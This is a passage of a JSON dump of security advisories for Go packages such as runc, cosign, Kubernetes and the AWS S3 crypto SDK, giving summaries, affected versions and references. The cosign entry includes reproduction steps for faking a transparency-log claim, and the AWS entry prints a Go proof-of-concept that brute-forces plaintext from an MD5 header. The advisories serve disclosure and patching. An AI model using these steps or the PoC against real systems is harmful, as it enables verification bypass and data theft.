"https://nvd.nist.gov/vuln/detail/CVE-2020-28466"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/pull/1731"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/pull/1731/commits/2e3c22672936f4980d343fb1d328b38919e74796"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMNATSIONATSSERVERSERVER-1042967"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2021/03/16/1"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2021/03/16/2"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T20:38:22Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-9q3g-m353-cp4p", "modified": "2023-02-07T22:14:30Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2017-11480"], "summary": "Denial of Service in Packetbeat", "details": "Packetbeat versions prior to 5.6.4 and 6.0.0 are affected by a denial of service flaw in the PostgreSQL protocol handler. If Packetbeat is listening for PostgreSQL traffic and a user is able to send arbitrary network traffic to the monitored port, the attacker could prevent Packetbeat from properly logging other PostgreSQL traffic.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/elastic/beats"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.6.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/elastic/beats"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.0.0-alpha1"}, {"fixed": "6.0.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-11480"}, {"type": "WEB", "url": "https://github.com/elastic/beats/pull/5457"}, {"type": "WEB", "url": "https://github.com/elastic/beats/pull/5479"}, {"type": "WEB", "url": "https://github.com/elastic/beats/pull/5480"}, {"type": "WEB", "url": "https://github.com/elastic/beats/commit/aeca65779d573976981587ca1d1461399e1b59dd"}, {"type": "WEB", "url": "https://discuss.elastic.co/t/beats-5-6-4-security-update/106739"}, {"type": "PACKAGE", "url": "https://github.com/elastic/beats"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0643"}], "database_specific": {"cwe_ids": ["CWE-404"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-19T22:35:34Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-xjqr-g762-pxwp", "modified": "2023-10-02T13:12:28Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2021-20206"], "summary": "containernetworking/cni improper limitation of path name", "details": "An improper limitation of path name flaw was found in containernetworking/cni in versions before 0.8.1. When specifying the plugin to load in the 'type' field in the network configuration, it is possible to use special elements such as \"../\" separators to reference binaries elsewhere on the system. This flaw allows an attacker to execute other existing binaries other than the cni plugins/types, such as 'reboot'. The highest threat from this vulnerability is to confidentiality, integrity, as well as system availability.\n### Specific Go Packages Affected\ngithub.com/containernetworking/cni/pkg/invoke", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containernetworking/cni"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.8.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-20206"}, {"type": "WEB", "url": "https://github.com/containernetworking/cni/pull/808"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1919391"}, {"type": "PACKAGE", "url": "https://github.com/containernetworking/cni"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0230"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCONTAINERNETWORKINGCNIPKGINVOKE-1070549"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-18T21:07:06Z", "nvd_published_at": "2021-03-26T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fgv8-vj5c-2ppq", "modified": "2023-02-24T17:01:49Z", "published": "2022-02-22T15:38:08Z", "aliases": ["CVE-2019-16884"], "summary": "Incorrect Authorization in runc", "details": "runc through 1.0.0-rc8, as used in Docker through 19.03.2-ce and other products, allows AppArmor restriction bypass because libcontainer/rootfs_linux.go incorrectly checks mount targets, and thus a malicious Docker image can mount over a /proc directory.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/opencontainers/runc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0-rc8.0.20190930145003-cad42f6e0932"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/opencontainers/selinux"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.1-0.20190929122143-5215b1806f52"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-16884"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/issues/2128"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/pull/2129"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/pull/2130"}, {"type": "WEB", "url": "https://github.com/crosbymichael/runc/commit/78dce1cf1ec36bbe7fe6767bdb81f7cbf6d34d70"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/commit/cad42f6e0932db0ce08c3a3d9e89e6063ec283e4"}, {"type": "WEB", "url": "https://github.com/opencontainers/selinux/commit/03b517dc4fd57245b1cf506e8ba7b817b6d309da"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3940"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4074"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4269"}, {"type": "PACKAGE", "url": "https://github.com/opencontainers/runc"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2023/02/msg00016.html"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/62OQ2P7K5YDZ5BRCH2Q6DHUJIHQD3QCD/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DGK6IV5JGVDXHOXEKJOJWKOVNZLT6MYR/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SPK4JWP32BUIVDJ3YODZSOEVEW6BHQCF/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0085"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202003-21"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220221-0004/"}, {"type": "WEB", "url": "https://usn.ubuntu.com/4297-1/"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-10/msg00073.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-11/msg00009.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-01/msg00010.html"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-02-22T15:38:08Z", "nvd_published_at": "2019-09-25T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4cxw-hq44-r344", "modified": "2022-03-03T19:17:50Z", "published": "2022-02-24T00:00:52Z", "aliases": ["CVE-2021-4070"], "summary": "Off-by-one Error in v2fly/v2ray-core", "details": "v2fly/v2ray-core prior to 4.44.0 is vulnerable to an off-by-one error. Indexing operations on arrays, slices, or strings should use an index at most one less than the length. If the index is checked for being less than or equal to the length (`<=`), instead of less than the length (`<`), the index could be out of bounds.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/v2fly/v2ray-core/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.44.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/v2fly/v2ray-core"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}], "database_specific": {"last_known_affected_version_range": "< 4.44.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-4070"}, {"type": "WEB", "url": "https://github.com/v2fly/v2ray-core/commit/c1af2bfd7aa59a4482aa7f6ec4b9208c1d350b5c"}, {"type": "PACKAGE", "url": "https://github.com/v2fly/v2ray-core"}, {"type": "WEB", "url": "https://huntr.dev/bounties/8da19456-4d89-41ef-9781-a41efd6a1877"}], "database_specific": {"cwe_ids": ["CWE-193"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-02-24T20:44:31Z", "nvd_published_at": "2022-02-23T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x27w-qxhg-343v", "modified": "2021-05-20T17:02:56Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2017-14623"], "summary": "Access Restriction Bypass in go-ldap", "details": "In the ldap.v2 (aka go-ldap) package through 2.5.0 for Go, an attacker may be able to login with an empty password. This issue affects an application using this package if these conditions are met: (1) it relies only on the return error of the Bind function call to determine whether a user is authorized (i.e., a nil return value is interpreted as successful authorization) and (2) it is used with an LDAP server allowing unauthenticated bind.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-ldap/ldap"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.5.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-14623"}, {"type": "WEB", "url": "https://github.com/go-ldap/ldap/pull/126"}, {"type": "WEB", "url": "https://github.com/go-ldap/ldap/commit/95ede1266b237bf8e9aa5dce0b3250e51bfefe66"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T17:02:56Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-rrp4-2xx3-mv29", "modified": "2022-02-07T21:07:25Z", "published": "2022-02-01T00:47:33Z", "aliases": ["CVE-2022-21687"], "summary": "Command injection in gh-ost", "details": "Gh-ost version <= 1.1.2 allows users to inject DSN strings via the `-database` parameter.\n\nThis is a low severity vulnerability as the attacker must have access to the target host or trick an administrator into executing a malicious `gh-ost` command on a host running `gh-ost`, plus network access from host running `gh-ost` to the attack's malicious MySQL server.\n\n### Impact\nThis issue may lead to arbitrary local file read.\n\n### Patches\nFixed in 1.1.3+.\n\n### Workarounds\nNone\n\n### References\n- https://advisory.dw1.io/51\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [github/gh-ost](http://github.com/github/gh-ost)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/github/gh-ost"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/github/gh-ost/security/advisories/GHSA-rrp4-2xx3-mv29"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-21687"}, {"type": "WEB", "url": "https://github.com/github/gh-ost/commit/a91ab042de013cfd8fbb633763438932d9080d8f"}, {"type": "PACKAGE", "url": "https://github.com/github/gh-ost"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-74"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-01-31T20:45:59Z", "nvd_published_at": "2022-02-01T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ccxc-vr6p-4858", "modified": "2022-03-08T18:26:05Z", "published": "2022-02-22T19:34:09Z", "aliases": ["CVE-2022-23649"], "summary": "Improper Certificate Validation in Cosign", "details": "### Impact\n\nCosign can be manipulated to claim that an entry for a signature exists in the Rekor transparency log even if it doesn't. This requires the attacker to have pull and push permissions for the signature in OCI. This can happen with both standard signing with a keypair and \"keyless signing\" with Fulcio.\n\n#### Signing with a keypair\n\n<details>\n\nTo reproduce this vulnerability, create a keypair and sign an image. Don't store the signature in Rekor:\n\n```\n$ cosign generate-key-pair       \n$ cosign sign --key cosign.key IMAGE\n```\n\nIf an attacker has access to the signature in OCI, they can manipulate cosign into believing the entry was stored in Rekor even though it wasn't. To accomplish this, the attacker needs to:\n\n1. Pull the signature image\n2. Annotate the signature image with any valid Rekor bundle under the `dev.sigstore.cosign/bundle` annotation\n3. Push the signature image back to OCI\n\nVerification then prints out the following:\n\n```\n$ cosign verify [--key]  [IMAGE]\n\nVerification for [IMAGE] --\nThe following checks were performed on each of these signatures:\n  - The cosign claims were validated\n  - Existence of the claims in the transparency log was verified offline\n  - The signatures were verified against the specified public key\n  - Any certificates were verified against the Fulcio roots.\n\n[\u2026]\n```\n\nThe claim that `Existence of the claims in the transparency log was verified offline` is inaccurate since an entry for this image doesn't exist in the log.\nThe claim that `Any certificates were verified against the Fulcio roots.` is technically correct but since there were no certificates that should be explicitly called out.\n\n</details>\n\n#### \"Keyless signing\" with an OIDC flow\n\n<details>\n\nTo reproduce this vulnerability, sign the image with a Fulcio identity. Don't store the signature in Rekor: \n```\n$ COSIGN_EXPERIMENTAL=1 cosign sign IMAGE\n[...]\nIMAGE appears to be a private repository, please confirm uploading to the transparency log at \"https://rekor.sigstore.dev\" [Y/N]: n\n\n```\n\nThen, create a keypair and sign the image again. Store an entry for the signature in Rekor:\n\n```\n$ cosign generate-key-pair       \n$ COSIGN_EXPERIMENTAL=1 cosign sign --key cosign.key IMAGE\n\nEnter password for private key: IMAGE appears to be a private repository, please confirm uploading to the transparency log at \"https://rekor.sigstore.dev\" [Y/N]: y\n```\n\nIf an attacker has access to the signature in OCI, they can manipulate cosign into believing the entry was stored in Rekor even though it wasn't. To accomplish this, the attacker needs to:\n\n1. Pull the signature image\n2. Copy the rekor bundle from the second signature into the first signature under the `dev.sigstore.cosign/bundle` annotation\n3. Push the signature image back to OCI\n\n_Note: For this to work, both signatures must occur during the valid lifespan of the certificate (~20 minutes)._\n\nVerification then prints out the following:\n\n```\n$ cosign verify [--key]  [IMAGE]\n\nVerification for [IMAGE] --\nThe following checks were performed on each of these signatures:\n  - The cosign claims were validated\n  - Existence of the claims in the transparency log was verified offline\n  - The signatures were verified against the specified public key\n  - Any certificates were verified against the Fulcio roots.\n\n[\u2026]\n```\n\nThe claim that `Existence of the claims in the transparency log was verified offline` is inaccurate since an entry for this image doesn't exist in the log.\n\nThe claim that `Any certificates were verified against the Fulcio roots.` is technically correct but since there were no certificates that should be explicitly called out.\n\n</details>\n\n\n### Patches\nThe vulnerability has been patched in v1.5.2 of cosign.\n\nThe `signature` in the `signedEntryTimestamp` provided by Rekor is now compared to the `signature` that is being verified. If these don't match, then an error is returned. If a valid bundle is copied to a different signature, verification should fail. \n\nCosign output now only informs the user that certificates were verified if a certificate was in fact verified.\n\n\n### Workarounds\nThe only workaround is upgrading.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [cosign](https://github.com/sigstore/cosign)\n* Send us a message on [Slack](https://sigstore.slack.com/). Invite link [here](https://join.slack.com/t/sigstore/shared_invite/zt-mhs55zh0-XmY3bcfWn4XEyMqUUutbUQ).\n\n### Thank you\nThank you to @mtrmac for finding and reporting this vulnerability.\n\nThank you to everyone who worked on fixing this:\n* @nsmith5\n* @znewman01 \n* @dlorenc\n* @mattmoor \n* @priyawadhwa\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sigstore/cosign"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/sigstore/cosign/security/advisories/GHSA-ccxc-vr6p-4858"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23649"}, {"type": "WEB", "url": "https://github.com/sigstore/cosign/commit/96d410a6580e4e81d24d112a0855c70ca3fb5b49"}, {"type": "PACKAGE", "url": "https://github.com/sigstore/cosign/"}, {"type": "WEB", "url": "https://github.com/sigstore/cosign/releases/tag/v1.5.2"}], "database_specific": {"cwe_ids": ["CWE-295"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-02-22T19:34:09Z", "nvd_published_at": "2022-02-18T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9cwv-cppx-mqjm", "modified": "2022-02-25T15:39:14Z", "published": "2022-02-23T21:17:25Z", "aliases": ["CVE-2022-23652"], "summary": "Improper Authentication in Capsule Proxy", "details": "### Impact\n\nUsing a malicious `Connection` header, an attacker with a proper authentication mechanism could start a privilege escalation towards the Kubernetes API Server, being able to exploit the `cluster-admin` Role bound to `capsule-proxy`.\n\n### Patches\n\nPatch has been merged in the v0.2.1 release.\n\n### Workarounds\n\nUpgrading is mandatory.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/clastix/capsule-proxy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/clastix/capsule-proxy/security/advisories/GHSA-9cwv-cppx-mqjm"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23652"}, {"type": "WEB", "url": "https://github.com/clastix/capsule-proxy/issues/188"}, {"type": "WEB", "url": "https://github.com/clastix/capsule-proxy/commit/efe91f68ebf8a9e3d21491dc57da7b8a746415d8"}, {"type": "PACKAGE", "url": "https://github.com/clastix/capsule-proxy/"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-02-23T21:17:25Z", "nvd_published_at": "2022-02-22T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-93p5-8fqw-wjx3", "modified": "2023-10-02T11:44:19Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2021-25834"], "summary": "Authentication bypass by capture-replay in github.com/cosmos/ethermint", "details": "Cosmos Network Ethermint <= v0.4.0 is affected by a transaction replay vulnerability in the EVM module. If the victim sends a very large nonce transaction, the attacker can replay the transaction through the application.\n\n### Specific Go Packages Affected\ngithub.com/cosmos/ethermint/rpc/namespaces/eth", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cosmos/ethermint"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-25834"}, {"type": "WEB", "url": "https://github.com/cosmos/ethermint/issues/686"}, {"type": "WEB", "url": "https://github.com/cosmos/ethermint/commit/d7bdbd7488644f0aaeee5cdcdc119c863f199f72"}, {"type": "WEB", "url": "https://github.com/cosmos/ethermint/releases/tag/v0.4.1"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-294"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T21:17:36Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-76wf-9vgp-pj7w", "modified": "2023-10-02T16:21:14Z", "published": "2022-02-11T23:26:12Z", "aliases": [], "summary": "Unencrypted md5 plaintext hash in metadata in AWS S3 Crypto SDK for golang", "details": "### Summary\n\nThe golang AWS S3 Crypto SDK was impacted by an issue that can result in loss of confidentiality. An attacker with read access to an encrypted S3 bucket was able to recover the plaintext without accessing the encryption key.\n\n### Specific Go Packages Affected\ngithub.com/aws/aws-sdk-go/service/s3/s3crypto\n\n### Risk/Severity\n\nThe vulnerability poses insider risks/privilege escalation risks, circumventing KMS controls for stored data.\n\n### Impact\n\nThe issue has been fully mitigated by AWS as of Aug. 5th by disallowing the header in question.\n\nThe S3 crypto library tries to store an unencrypted hash of the plaintext alongside the ciphertext as a metadata field. This hash can be used to brute force the plaintext in an offline attack, if the hash is readable to the attacker. In order to be impacted by this issue, the attacker has to be able to guess the plaintext as a whole. The attack is theoretically valid if the plaintext entropy is below the key size, i.e. if it is easier to brute force the plaintext instead of the key itself, but practically feasible only for short plaintexts or plaintexts otherwise accessible to the attacker in order to create a rainbow table.\n\nThe issue has been fixed server-side by AWS as of Aug 5th, by blocking the related metadata field. No S3 objects are affected anymore.\n\n### Mitigation\n\nThe header in question is no longer served by AWS, making this attack fully mitigated as of Aug. 5th.\n\n### Proof of concept\n\nA [Proof of concept](https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc) is available in a separate github repository, this particular issue can be found at [here](https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/hash_exploit.go):\n\n```golang\nfunc HashExploit(bucket string, key string, input *OfflineAttackInput) (string, error) {\n\t_, header, err := input.S3Mock.GetObjectDirect(bucket, key)\n\tlength, err := strconv.Atoi(header.Get(\"X-Amz-Meta-X-Amz-Unencrypted-Content-Length\"))\n\tplaintextMd5 := header.Get(\"X-Amz-Meta-X-Amz-Unencrypted-Content-Md5\")\n\tblocks := length / 16\n\tpossiblePlaintextNum := 1\n\tsegNum := len(input.PossiblePlaintextSegments)\n\tfor i := 0; i < blocks; i++ {\n\t\tpossiblePlaintextNum *= segNum\n\t}\n\tfor i := 0; i < possiblePlaintextNum; i++ {\n\t\tw := i\n\t\tguess := \"\"\n\t\tfor j := 0; j < blocks; j++ {\n\t\t\tguess += input.PossiblePlaintextSegments[w%segNum]\n\t\t\tw /= segNum\n\t\t}\n\t\tguessMd5 := md5.Sum([]byte(guess))\n\t\tif plaintextMd5 == base64.StdEncoding.EncodeToString(guessMd5[:]) {\n\t\t\treturn guess, nil\n\t\t}\n\t}\n\treturn \"\", fmt.Errorf(\"No plaintext found!\")\n}\n```\n\nThe PoC will only work on old versions of the library, as the hash has been removed from being calculated as well.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/aws/aws-sdk-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.34.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/google/security-research/security/advisories/GHSA-76wf-9vgp-pj7w"}, {"type": "WEB", "url": "https://github.com/aws/aws-sdk-go/commit/35fa6ddf45c061e0f08d3a3b5119f8f4da38f6d1"}, {"type": "PACKAGE", "url": "https://github.com/aws/aws-sdk-go"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0391"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T18:00:34Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-g7v2-2qxx-wjrw", "modified": "2021-05-20T16:33:03Z", "published": "2022-02-15T01:18:02Z", "aliases": ["CVE-2015-3627"], "summary": "Symlink Attack in Libcontainer and Docker Engine", "details": "Libcontainer and Docker Engine before 1.6.1 opens the file-descriptor passed to the pid-1 process before performing the chroot, which allows local users to gain privileges via a symlink attack in an image.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3627"}, {"type": "WEB", "url": "https://github.com/docker/docker/commit/d5ebb60bddbabea0439213501f4f6ed494b23cba"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!searchin/docker-user/1.6.1/docker-user/47GZrihtr-4/nwgeOOFLexIJ"}, {"type": "WEB", "url": "https://groups.google.com/forum/#%21searchin/docker-user/1.6.1/docker-user/47GZrihtr-4/nwgeOOFLexIJ"}, {"type": "WEB", "url": "https://lists.opensuse.org/opensuse-updates/2015-05/msg00023.html"}, {"type": "WEB", "url": "https://packetstormsecurity.com/files/131835/Docker-Privilege-Escalation-Information-Disclosure.html"}, {"type": "WEB", "url": "https://seclists.org/fulldisclosure/2015/May/28"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T16:33:03Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-997c-fj8j-rq5h", "modified": "2021-05-12T17:42:53Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2014-9357"], "summary": "Arbitrary Code Execution", "details": "Docker 1.3.2 allows remote attackers to execute arbitrary code with root privileges via a crafted (1) image or (2) build in a Dockerfile in an LZMA (.xz) archive, related to the chroot for archive extraction.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9357"}, {"type": "WEB", "url": "https://github.com/docker/docker/compare/aef842e7dfb534aba22c3c911de525ce9ac12b72...313a1b7620910e47d888f8b0a6a5eb06ad9c1ff2"}, {"type": "WEB", "url": "https://github.com/moby/moby/blob/master/CHANGELOG.md#133-2014-12-11"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!msg/docker-user/nFAz-B-n4Bw/0wr3wvLsnUwJ"}, {"type": "WEB", "url": "https://groups.google.com/forum/#%21msg/docker-user/nFAz-B-n4Bw/0wr3wvLsnUwJ"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9357"}, {"type": "WEB", "url": "http://www.securityfocus.com/archive/1/534215/100/0/threaded"}], "database_specific": {"cwe_ids": ["CWE-285"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T17:42:53Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-qh36-44jv-c8xj", "modified": "2022-03-30T21:11:43Z", "published": "2022-02-02T00:01:58Z", "aliases": ["CVE-2020-8562"], "summary": "Potential proxy IP restriction bypass in Kubernetes", "details": "As mitigations to a report from 2019 and CVE-2020-8555, Kubernetes attempts to prevent proxied connections from accessing link-local or localhost networks when making user-driven connections to Services, Pods, Nodes, or StorageClass service providers. As part of this mitigation Kubernetes does a DNS name resolution check and validates that response IPs are not in the link-local (169.254.0.0/16) or localhost (127.0.0.0/8) range. Kubernetes then performs a second DNS resolution without validation for the actual connection. If a non-standard DNS server returns different non-cached responses, a user may be able to bypass the proxy IP restriction and access private networks on the control plane.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.21.0"}, {"fixed": "1.21.1"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.20.0"}, {"fixed": "1.20.7"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.19.0"}, {"fixed": "1.19.11"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.18.19"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8562"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/101493"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220225-0002/"}], "database_specific": {"cwe_ids": ["CWE-367"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-02-03T17:52:40Z", "nvd_published_at": "2022-02-01T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wpfr-6297-9v57", "modified": "2022-02-09T22:29:01Z", "published": "2022-02-09T22:29:01Z", "aliases": [], "summary": "User object created with invalid provider data in GoTrue", "details": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nUnder certain circumstances a valid user object would have been created with invalid provider metadata.\n\nThis vulnerability affects everyone running an instance of GoTrue as a service. We advise you to update especially if you are using the provider metadata from the user object to secure other resources.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nA patch is available with the release of version [1.0.1 on Github](https://github.com/netlify/gotrue/releases/tag/v1.0.1).\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nIf you don't rely on the provider metadata in the user object, you might 